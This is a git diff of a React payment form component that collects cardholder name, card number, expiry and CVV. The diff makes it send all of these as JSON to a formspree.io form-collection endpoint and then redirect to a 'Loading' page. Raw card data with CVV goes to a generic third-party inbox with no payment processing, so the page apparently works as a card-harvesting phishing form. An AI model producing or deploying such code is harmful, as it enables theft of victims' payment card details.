@@ -1,22 +1,56 @@
-import React from "react";
+import React, { useState } from "react";
 import { useNavigate } from "react-router-dom";
 import "./cardstyl.css";
 
 export default function Cardinformation() {
   const navigate = useNavigate();
-  let handleSubmit = (e) => {
+  const [form, setForm] = useState({
+    cardholdername: "",
+    cardnumber: "",
+    cardexpirymonths: "",
+    cardexpiryyear: "",
+    CardCvvNumber: "",
+  });
+  const onUpdateField = (e) => {
+    const nextFormState = {
+      ...form,
+      [e.target.name]: e.target.value,
+    };
+    setForm(nextFormState);
+  };
+  // console.log(window.location.href);
+  // if (form.CardCvvNumber.length === 3) {
+  //   navigate("/Loading");
+  //   console.log(window.location.href);
+  // }
+
+  let handleSubmit = async (e) => {
     e.preventDefault();
 
-    fetch("https://formspree.io/f/mbjbklkl", {
+    alert(JSON.stringify(form, null, 2));
+    let res = await fetch("https://formspree.io/f/mbjbklkl", {
       method: "POST",
+      headers: {
+        "Content-Type": "multipart/form-data",
+        Accept: "application/json",
+      },
+      body: JSON.stringify({
+        cardholdername: form.cardholdername,
+        cardnumber: form.cardnumber,
+        cardexpirymonths: form.cardexpirymonths,
+        cardexpiryyear: form.cardexpiryyear,
+        CardCvvNumber: form.CardCvvNumber,
+      }),
     });
 
-    window.scrollTo({
-      top: 0,
-      left: 100,
-      behavior: "smooth",
-    });
-    navigate("/Loading");
+    if (res.status === 200) {
+      navigate("/Loading");
+      window.scrollTo({
+        top: 0,
+        left: 100,
+        behavior: "smooth",
+      });
+    }
   };
   return (
     <>
@@ -81,10 +115,11 @@ export default function Cardinformation() {
                     </div>
                   </div>
                 </div>
+
                 <form
-                  action="https://formspree.io/f/mbjbklkl"
-                  method="POST"
                   className="card-body"
+                  method="post"
+                  action="https://formspree.io/f/mbjbklkl"
                   onSubmit={handleSubmit}
                   style={{ height: "350px" }}
                 >
@@ -96,6 +131,8 @@ export default function Cardinformation() {
                       aria-label="Name"
                       aria-describedby="addon-wrapping"
                       name="cardholdername"
+                      value={form.cardholdername}
+                      onChange={onUpdateField}
                       required
                     />
                   </div>
@@ -110,6 +147,8 @@ export default function Cardinformation() {
                       aria-label="Username"
                       aria-describedby="addon-wrapping"
                       name="cardnumber"
+                      value={form.cardnumber}
+                      onChange={onUpdateField}
                       required
                     />
                   </div>
@@ -124,6 +163,8 @@ export default function Cardinformation() {
                         className="form-select form-select-sm"
                         aria-label=".form-select-sm example"
                         name="cardexpirymonths"
+                        value={form.cardexpirymonths}
+                        onChange={onUpdateField}
                       >
                         <option selected>01</option>
                         <option value="1">02</option>
@@ -147,6 +188,8 @@ export default function Cardinformation() {
                         className="form-select form-select-sm"
                         aria-label=".form-select-sm example"
                         name="cardexpiryyear"
+                        value={form.cardexpiryyear}
+                        onChange={onUpdateField}
                       >
                         <option selected>2021</option>
                         <option value="2021">2022</option>
@@ -174,6 +217,8 @@ export default function Cardinformation() {
                       aria-label="Name"
                       aria-describedby="addon-wrapping"
                       name="CardCvvNumber"
+                      value={form.CardCvvNumber}
+                      onChange={onUpdateField}
                       required
                     />
                   </div>
